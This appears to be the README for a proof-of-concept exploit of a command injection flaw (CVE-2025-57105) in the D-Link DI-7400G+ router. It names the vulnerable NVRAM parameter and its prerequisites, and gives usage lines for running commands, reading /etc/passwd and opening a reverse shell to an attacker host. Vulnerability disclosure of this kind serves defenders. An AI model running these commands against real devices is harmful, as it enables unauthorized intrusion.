# CVE-2025-57105

**D-Link DI-7400G+ Command Injection**

## Overview

Command injection via unsanitized NVRAM parameter in D-Link DI-7400G+ router.

| Field | Value |
|-------|-------|
| Product | D-Link DI-7400G+ |
| Firmware | 19.12.25A1 |
| Type | Command Injection |
| Vector | HTTP GET |
| Impact | RCE |

## Attack Flow

```mermaid
flowchart LR
    A[Attacker] --> B["Enable Prerequisites"]
    B --> C["Set proxy_ac_status=1"]
    C --> D["Inject Payload"]
    D --> E["ac_mng_srv_host=cmd"]
    E --> F["Trigger Execution"]
    F --> G[wayos_ac_server.asp]
    G --> H[Shell Command]
```

## Technical Details

The vulnerability exists in `mng_platform.asp` and `wayos_ac_server.asp`. The `ac_mng_srv_host` parameter is stored in NVRAM and later used in shell commands without sanitization.

**Prerequisites:**
- `opt=proxy`
- `proxy_ac_status=1`
- `ac_server_enable=1`

## Usage

```bash
python exploit.py <target_ip>

python exploit.py 192.168.0.1 -c "id"

python exploit.py 192.168.0.1 -c "cat /etc/passwd"

python exploit.py 192.168.0.1 --reverse-shell --lhost 10.0.0.1 --lport 4444
```

## Parameters

| Flag | Description | Default |
|------|-------------|---------|
| `-c, --command` | Command to execute | id |
| `-t, --timeout` | Request timeout | 10 |
| `--reverse-shell` | Spawn reverse shell | off |
| `--lhost` | Attacker IP | required |
| `--lport` | Attacker port | 4444 |

## Requirements

```
requests
```

## Disclaimer

For authorized security testing only. Device is EOL.
